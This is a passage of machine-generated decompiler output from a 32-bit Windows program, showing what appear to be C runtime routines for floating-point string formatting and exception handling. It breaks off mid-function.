undefined4 * __cdecl FUN_00417c4c(undefined4 *param_1,undefined4 param_2)

{
  undefined (*pauVar1) [16];
  
  *param_1 = param_2;
  pauVar1 = FUN_0040cdba();
  param_1[1] = *(undefined4 *)(pauVar1[9] + 8);
  pauVar1 = FUN_0040cdba();
  *(undefined4 **)(pauVar1[9] + 8) = param_1;
  return param_1;
}



undefined4 __cdecl FUN_00417c78(int param_1)

{
  undefined (*pauVar1) [16];
  int *piVar2;
  
  pauVar1 = FUN_0040cdba();
  piVar2 = *(int **)(pauVar1[9] + 8);
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



void __cdecl FUN_00417c9f(int param_1)

{
  int iVar1;
  undefined (*pauVar2) [16];
  int iVar3;
  
  pauVar2 = FUN_0040cdba();
  if (param_1 == *(int *)(pauVar2[9] + 8)) {
    pauVar2 = FUN_0040cdba();
    *(undefined4 *)(pauVar2[9] + 8) = *(undefined4 *)(param_1 + 4);
  }
  else {
    pauVar2 = FUN_0040cdba();
    iVar1 = *(int *)(pauVar2[9] + 8);
    do {
      iVar3 = iVar1;
      if (*(int *)(iVar3 + 4) == 0) {
        FUN_00414e94();
        return;
      }
      iVar1 = *(int *)(iVar3 + 4);
    } while (param_1 != *(int *)(iVar3 + 4));
    *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(param_1 + 4);
  }
  return;
}



undefined4 __cdecl
FUN_00417cf1(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,int param_5)

{
  undefined4 uVar1;
  int **unaff_FS_OFFSET;
  int *local_1c;
  code *local_18;
  uint local_14;
  undefined4 local_10;
  undefined4 local_c;
  int local_8;
  
  local_14 = DAT_00422044 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = FUN_00417a2e;
  local_c = param_1;
  local_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_1c;
  uVar1 = FUN_00419580(param_3,param_1,param_5);
  *unaff_FS_OFFSET = local_1c;
  return uVar1;
}



void __cdecl FUN_00417d51(byte *param_1,undefined (**param_2) [16])

{
  byte bVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  undefined2 extraout_var;
  bool bVar5;
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_2);
  uVar4 = FUN_00417610((int)(char)*param_1);
  bVar5 = uVar4 == 0x65;
  while (!bVar5) {
    param_1 = param_1 + 1;
    uVar3 = FUN_00417042((uint)*param_1);
    bVar5 = CONCAT22(extraout_var,uVar3) == 0;
  }
  uVar4 = FUN_00417610((int)(char)*param_1);
  if (uVar4 == 0x78) {
    param_1 = param_1 + 2;
  }
  bVar2 = *param_1;
  *param_1 = ***(byte ***)(local_14[0] + 0xbc);
  do {
    param_1 = param_1 + 1;
    bVar1 = *param_1;
    *param_1 = bVar2;
    bVar2 = bVar1;
  } while (*param_1 != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



void __cdecl FUN_00417dc4(char *param_1,undefined (**param_2) [16])

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  FUN_0040b970(local_14,param_2);
  cVar3 = *param_1;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      param_1 = param_1 + 1;
      cVar3 = *param_1;
    } while (cVar3 != '\0');
  }
  if (*param_1 != '\0') {
    do {
      param_1 = param_1 + 1;
      cVar3 = *param_1;
      pcVar1 = param_1;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *param_1;
      pcVar1 = pcVar1 + 1;
      param_1 = param_1 + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



undefined4 __cdecl FUN_00417e46(double *param_1)

{
  if (0.0 < *param_1 != (*param_1 == 0.0)) {
    return 1;
  }
  return 0;
}



void __cdecl FUN_00417e62(uint param_1,uint *param_2,char *param_3,undefined (**param_4) [16])

{
  uint local_c;
  uint local_8;
  
  if (param_1 == 0) {
    FUN_00419674(&param_1,param_3,param_4);
    *param_2 = param_1;
  }
  else {
    FUN_004195cc(&local_c,param_3,param_4);
    *param_2 = local_c;
    param_2[1] = local_8;
  }
  return;
}



void __cdecl FUN_00417ea4(uint param_1,uint *param_2,char *param_3)

{
  FUN_00417e62(param_1,param_2,param_3,(undefined (**) [16])0x0);
  return;
}



void FUN_00417ebe(void)

{
  uint *in_EAX;
  char *pcVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    pcVar1 = FUN_00415330(in_EAX);
    FUN_0040c2f0((undefined4 *)((int)in_EAX + unaff_EDI),in_EAX,(uint)(pcVar1 + 1));
  }
  return;
}



void __cdecl FUN_00417edd(byte *param_1)

{
  FUN_00417d51(param_1,(undefined (**) [16])0x0);
  return;
}



void __cdecl FUN_00417ef0(char *param_1)

{
  FUN_00417dc4(param_1,(undefined (**) [16])0x0);
  return;
}



undefined4 __cdecl
FUN_00417f03(uint param_1,int param_2,int param_3,int *param_4,char param_5,
            undefined (**param_6) [16])

{
  undefined *in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *pcVar6;
  undefined4 uVar7;
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    uVar7 = 0x16;
  }
  else {
    iVar2 = param_2;
    if (param_2 < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 9U < param_1) {
      if (param_5 != '\0') {
        FUN_00417ebe();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      pcVar6 = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)pcVar6);
      }
      iVar2 = FUN_0040bcd6(pcVar6,(int)puVar4,s_e_000_00420044);
      if (iVar2 != 0) {
        FUN_0040c91a();
      }
      if (param_3 != 0) {
        *pcVar6 = 'E';
      }
      if (*(char *)param_4[3] != '0') {
        iVar2 = param_4[1] + -1;
        if (iVar2 < 0) {
          iVar2 = -iVar2;
          pcVar6[1] = '-';
        }
        if (99 < iVar2) {
          iVar3 = iVar2 / 100;
          iVar2 = iVar2 % 100;
          pcVar6[2] = pcVar6[2] + (char)iVar3;
        }
        if (9 < iVar2) {
          iVar3 = iVar2 / 10;
          iVar2 = iVar2 % 10;
          pcVar6[3] = pcVar6[3] + (char)iVar3;
        }
        pcVar6[4] = pcVar6[4] + (char)iVar2;
      }
      if (((DAT_00425770 & 1) != 0) && (pcVar6[2] == '0')) {
        FUN_0040c2f0((undefined4 *)(pcVar6 + 2),(undefined4 *)(pcVar6 + 3),3);
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 0;
    }
    puVar1 = (undefined4 *)FUN_0040caaa();
    uVar7 = 0x22;
  }
  *puVar1 = uVar7;
  FUN_0040ca42();
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar7;
}



void __cdecl
FUN_00418072(undefined4 *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
            undefined (**param_6) [16])

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  int local_30 [4];
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_00419898(*param_1,param_1[1],local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar4 = extraout_EDX;
  }
  else {
    if (param_3 == 0xffffffff) {
      uVar2 = 0xffffffff;
    }
    else {
      uVar2 = (param_3 - (local_30[0] == 0x2d)) - (uint)(0 < param_4);
    }
    iVar3 = FUN_0041971c((undefined4 *)(param_2 + (uint)(0 < param_4) + (uint)(local_30[0] == 0x2d))
                         ,uVar2,param_4 + 1,(int)local_30);
    if (iVar3 == 0) {
      FUN_00417f03(param_3,param_4,param_5,local_30,'\0',param_6);
      uVar4 = extraout_EDX_01;
    }
    else {
      *param_2 = 0;
      uVar4 = extraout_EDX_00;
    }
  }
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar4);
  return;
}



void __cdecl
FUN_00418142(undefined4 *param_1,undefined *param_2,uint param_3,int param_4,int param_5)

{
  FUN_00418072(param_1,param_2,param_3,param_4,param_5,(undefined (**) [16])0x0);
  return;
}



int __cdecl
FUN_00418162(uint *param_1,undefined *param_2,uint param_3,uint param_4,int param_5,
            undefined (**param_6) [16])

{
  undefined (*pauVar1) [16];
  ushort uVar2;
  int *piVar3;
  uint uVar4;
  char *pcVar5;
  undefined (*pauVar6) [16];
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  undefined (*pauVar10) [16];
  undefined (*pauVar11) [16];
  char *pcVar12;
  bool bVar13;
  ulonglong uVar14;
  undefined8 uVar15;
  int iVar16;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  FUN_0040b970(local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar3 = (int *)FUN_0040caaa();
    iVar16 = 0x16;
LAB_0041819d:
    *piVar3 = iVar16;
    FUN_0040ca42();
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar16;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar3 = (int *)FUN_0040caaa();
    iVar16 = 0x22;
    goto LAB_0041819d;
  }
  local_10 = *param_1;
  if ((param_1[1] >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      uVar4 = 0xffffffff;
    }
    else {
      uVar4 = param_3 - 2;
    }
    iVar16 = FUN_00418142(param_1,param_2 + 2,uVar4,param_4,0);
    if (iVar16 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return iVar16;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return iVar16;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar5 = FUN_0040bf10(param_2 + 2,'e');
    if (pcVar5 != (char *)0x0) {
      *pcVar5 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar5[3] = '\0';
    }
    goto LAB_004184c1;
  }
  if ((param_1[1] & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((param_1[1] & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*param_1 | param_1[1] & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pauVar10 = (undefined (*) [16])(param_2 + 3);
  pauVar11 = (undefined (*) [16])(param_2 + 4);
  if (param_4 == 0) {
    (*pauVar10)[0] = 0;
  }
  else {
    (*pauVar10)[0] = *(undefined *)**(undefined4 **)(local_28[0] + 0xbc);
  }
  if (((param_1[1] & 0xfffff) != 0) || (local_c = 0, *param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar14 = FUN_00419a10((byte)local_8,param_1[1] & local_c & 0xfffff);
      uVar2 = (short)uVar14 + 0x30;
      if (0x39 < uVar2) {
        uVar2 = uVar2 + sVar9;
      }
      local_8 = local_8 + -4;
      (*pauVar11)[0] = (char)uVar2;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pauVar11 = (undefined (*) [16])(*pauVar11 + 1);
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar14 = FUN_00419a10((byte)local_8,param_1[1] & local_c & 0xfffff), pauVar1 = pauVar11,
       8 < (ushort)uVar14)) {
      while( true ) {
        pauVar6 = (undefined (*) [16])(pauVar1[-1] + 0xf);
        if (((*pauVar6)[0] != 'f') && ((*pauVar6)[0] != 'F')) break;
        (*pauVar6)[0] = 0x30;
        pauVar1 = pauVar6;
      }
      if (pauVar6 == pauVar10) {
        pauVar1[-1][0xe] = pauVar1[-1][0xe] + '\x01';
      }
      else if ((*pauVar6)[0] == '9') {
        (*pauVar6)[0] = (char)sVar9 + ':';
      }
      else {
        (*pauVar6)[0] = (*pauVar6)[0] + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    FUN_0040f8c0(pauVar11,0x30,param_4);
    pauVar11 = (undefined (*) [16])(*pauVar11 + param_4);
  }
  if ((*pauVar10)[0] == '\0') {
    pauVar11 = pauVar10;
  }
  (*pauVar11)[0] = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar14 = FUN_00419a10(0x34,param_1[1]);
  uVar4 = (uint)(uVar14 & 0x7ff);
  uVar7 = uVar4 - local_18;
  uVar4 = (uint)(uVar4 < local_18);
  uVar8 = -uVar4;
  if (uVar4 == 0) {
    (*pauVar11)[1] = 0x2b;
  }
  else {
    (*pauVar11)[1] = 0x2d;
    bVar13 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar13);
  }
  pcVar12 = *pauVar11 + 2;
  *pcVar12 = '0';
  pcVar5 = pcVar12;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_00418470:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_0041847b;
  }
  else {
    uVar15 = FUN_00419930(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar15 >> 0x20);
    *pcVar12 = (char)uVar15 + '0';
    pcVar5 = *pauVar11 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar5 == pcVar12) goto LAB_00418470;
LAB_0041847b:
    uVar15 = FUN_00419930(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar15 >> 0x20);
    *pcVar5 = (char)uVar15 + '0';
    pcVar5 = pcVar5 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar5 != pcVar12) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar15 = FUN_00419930(uVar7,uVar8,10,0);
    *pcVar5 = (char)uVar15 + '0';
    pcVar5 = pcVar5 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar5 = (char)uVar7 + '0';
  pcVar5[1] = '\0';
LAB_004184c1:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



undefined4 __thiscall
FUN_004184d5(void *this,int param_1,uint param_2,char param_3,undefined (**param_4) [16])

{
  int iVar1;
  int *in_EAX;
  undefined4 *puVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  FUN_0040b970(local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    uVar4 = 0x16;
    *puVar2 = 0x16;
    FUN_0040ca42();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      FUN_00417ebe();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      FUN_00417ebe();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        FUN_00417ebe();
        FUN_0040f8c0((undefined (*) [16])(puVar3 + 1),0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



void __cdecl
FUN_004185cc(undefined4 *param_1,undefined *param_2,int param_3,uint param_4,
            undefined (**param_5) [16])

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  int local_30;
  int local_2c;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_00419898(*param_1,param_1[1],&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar4 = extraout_EDX;
  }
  else {
    if (param_3 == -1) {
      uVar2 = 0xffffffff;
    }
    else {
      uVar2 = param_3 - (uint)(local_30 == 0x2d);
    }
    iVar3 = FUN_0041971c((undefined4 *)(param_2 + (local_30 == 0x2d)),uVar2,local_2c + param_4,
                         (int)&local_30);
    if (iVar3 == 0) {
      FUN_004184d5(param_2,param_3,param_4,'\0',param_5);
      uVar4 = extraout_EDX_01;
    }
    else {
      *param_2 = 0;
      uVar4 = extraout_EDX_00;
    }
  }
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar4);
  return;
}



void __cdecl
FUN_00418687(undefined4 *param_1,undefined *param_2,uint param_3,uint param_4,int param_5,
            undefined (**param_6) [16])

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar4;
  undefined4 *puVar5;
  int local_34;
  int local_30;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  FUN_00419898(*param_1,param_1[1],&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar4 = extraout_EDX;
  }
  else {
    local_24 = local_30 + -1;
    if (param_3 == 0xffffffff) {
      uVar3 = 0xffffffff;
    }
    else {
      uVar3 = param_3 - (local_34 == 0x2d);
    }
    iVar2 = FUN_0041971c((undefined4 *)(param_2 + (local_34 == 0x2d)),uVar3,param_4,(int)&local_34);
    if (iVar2 == 0) {
      local_30 = local_30 + -1;
      if ((local_30 < -4) || ((int)param_4 <= local_30)) {
        FUN_00417f03(param_3,param_4,param_5,&local_34,'\x01',param_6);
        uVar4 = extraout_EDX_02;
      }
      else {
        puVar1 = (undefined4 *)(param_2 + (local_34 == 0x2d));
        if (local_24 < local_30) {
          do {
            puVar5 = puVar1;
            puVar1 = (undefined4 *)((int)puVar5 + 1);
          } while (*(char *)puVar5 != '\0');
          *(undefined *)((int)puVar5 + -1) = 0;
        }
        FUN_004184d5(param_2,param_3,param_4,'\x01',param_6);
        uVar4 = extraout_EDX_01;
      }
    }
    else {
      *param_2 = 0;
      uVar4 = extraout_EDX_00;
    }
  }
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar4);
  return;
}



void __cdecl
FUN_00418781(uint *param_1,undefined *param_2,uint param_3,int param_4,uint param_5,int param_6,
            undefined (**param_7) [16])

{
  if ((param_4 == 0x65) || (param_4 == 0x45)) {
    FUN_00418072(param_1,param_2,param_3,param_5,param_6,param_7);
  }
  else {
    if (param_4 == 0x66) {
      FUN_004185cc(param_1,param_2,param_3,param_5,param_7);
      return;
    }
    if ((param_4 == 0x61) || (param_4 == 0x41)) {
      FUN_00418162(param_1,param_2,param_3,param_5,param_6,param_7);
    }
    else {
      FUN_00418687(param_1,param_2,param_3,param_5,param_6,param_7);
    }
  }
  return;
}



void __cdecl
FUN_00418809(uint *param_1,undefined *param_2,uint param_3,int param_4,uint param_5,int param_6)

{
  FUN_00418781(param_1,param_2,param_3,param_4,param_5,param_6,(undefined (**) [16])0x0);
  return;
}



void FUN_0041882c(void)

{
  int iVar1;
  
  iVar1 = FUN_00419a2f((uint *)0x0,0x10000,0x30000);
  if (iVar1 != 0) {
    FUN_0040c91a();
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00418857(void)

{
  double dVar1;
  
  dVar1 = _DAT_00420050 - (_DAT_00420050 / _DAT_00420058) * _DAT_00420058;
  if (1.0 < dVar1 != NAN(dVar1)) {
    return 1;
  }
  return 0;
}



void FUN_00418895(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_0042007c);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_GAIsProcessorFeaturePresent_0042005e + 2);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  FUN_00418857();
  return;
}



undefined4 * __fastcall FUN_004188be(undefined4 *param_1,undefined param_2,undefined param_3)

{
  FUN_004113fd(param_1,(uint **)&param_3);
  *param_1 = &DAT_00420090;
  return param_1;
}



undefined4 * __thiscall FUN_004188e7(void *this,byte param_1)

{
  *(undefined **)this = &DAT_00420090;
  FUN_004114ca((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b6ac();
  }
  return (undefined4 *)this;
}



undefined4 __cdecl FUN_0041890e(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(undefined4 *)(iVar1 + 8) == '\0')) {
LAB_00418966:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00418945:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00418966;
    }
    else {
      iVar1 = FUN_00415bc0((undefined4 *)(iVar1 + 8),(byte *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00418945;
    }
    uVar2 = 0;
  }
  return uVar2;
}



undefined4 __cdecl FUN_0041896d(int **param_1)

{
  undefined (*pauVar1) [16];
  undefined4 uVar2;
  
  if (**param_1 == -0x1fbcb0b3) {
    pauVar1 = FUN_0040cdba();
    if (0 < *(int *)pauVar1[9]) {
      pauVar1 = FUN_0040cdba();
      *(int *)pauVar1[9] = *(int *)pauVar1[9] + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    pauVar1 = FUN_0040cdba();
    *(undefined4 *)pauVar1[9] = 0;
    uVar2 = FUN_00414e48();
    return uVar2;
  }
  return 0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_004189b6(void)

{
  int iVar1;
  int iVar2;
  undefined (*pauVar3) [16];
  int iVar4;
  int *piVar5;
  int unaff_EBP;
  int iVar6;
  
  FUN_0040d634(&DAT_00420870,0x10);
  iVar1 = *(int *)(unaff_EBP + 0x10);
  iVar2 = *(int *)(unaff_EBP + 8);
  if (*(int *)(iVar1 + 4) < 0x81) {
    iVar6 = (int)*(char *)(iVar2 + 8);
  }
  else {
    iVar6 = *(int *)(iVar2 + 8);
  }
  *(int *)(unaff_EBP + -0x1c) = iVar6;
  pauVar3 = FUN_0040cdba();
  *(int *)pauVar3[9] = *(int *)pauVar3[9] + 1;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  while (iVar6 != *(int *)(unaff_EBP + 0x14)) {
    if ((iVar6 < 0) || (*(int *)(iVar1 + 4) <= iVar6)) {
      FUN_00414e94();
    }
    iVar4 = iVar6 * 8;
    piVar5 = (int *)(*(int *)(iVar1 + 8) + iVar4);
    iVar6 = *piVar5;
    *(int *)(unaff_EBP + -0x20) = iVar6;
    *(undefined4 *)(unaff_EBP + -4) = 1;
    if (piVar5[1] != 0) {
      *(int *)(iVar2 + 8) = iVar6;
      FUN_00419580(*(undefined4 *)(*(int *)(iVar1 + 8) + 4 + iVar4),iVar2,0x103);
    }
    *(undefined4 *)(unaff_EBP + -4) = 0;
    *(int *)(unaff_EBP + -0x1c) = iVar6;
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_00418a7c();
  if (iVar6 != *(int *)(unaff_EBP + 0x14)) {
    FUN_00414e94();
  }
  *(int *)(iVar2 + 8) = iVar6;
  return;
}



void FUN_00418a7c(void)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cdba();
  if (0 < *(int *)pauVar1[9]) {
    pauVar1 = FUN_0040cdba();
    *(int *)pauVar1[9] = *(int *)pauVar1[9] + -1;
  }
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_00418adc(void)

{
  int *piVar1;
  undefined *UNRECOVERED_JUMPTABLE;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420898,8);
  piVar1 = *(int **)(unaff_EBP + 8);
  if ((((piVar1 != (int *)0x0) && (*piVar1 == -0x1f928c9d)) && (piVar1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(piVar1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    *(undefined4 *)(unaff_EBP + -4) = 0;
    FUN_0041799d(piVar1[6],UNRECOVERED_JUMPTABLE);
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  }
  return;
}



int __cdecl FUN_00418b31(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



undefined __cdecl FUN_00418b5a(int param_1)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  undefined local_5;
  
  if (unaff_EDI == (int *)0x0) {
    FUN_00414e94();
    FUN_00414e48();
  }
  local_c = 0;
  local_5 = 0;
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = FUN_0041890e((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = 1;
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



void FUN_00418bd5(void)

{
  code *pcVar1;
  undefined (*pauVar2) [16];
  int unaff_EBP;
  
  FUN_00419a9b(4);
  pauVar2 = FUN_0040cdba();
  if (*(int *)(pauVar2[9] + 4) != 0) {
    FUN_00414e94();
  }
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_00414e81();
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00414e48();
  pauVar2 = FUN_0040cdba();
  *(undefined4 *)(pauVar2[9] + 4) = *(undefined4 *)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void Catch_All_00418c06(void)

{
  code *pcVar1;
  undefined (*pauVar2) [16];
  int unaff_EBP;
  
  pauVar2 = FUN_0040cdba();
  *(undefined4 *)(pauVar2[9] + 4) = *(undefined4 *)(unaff_EBP + 8);
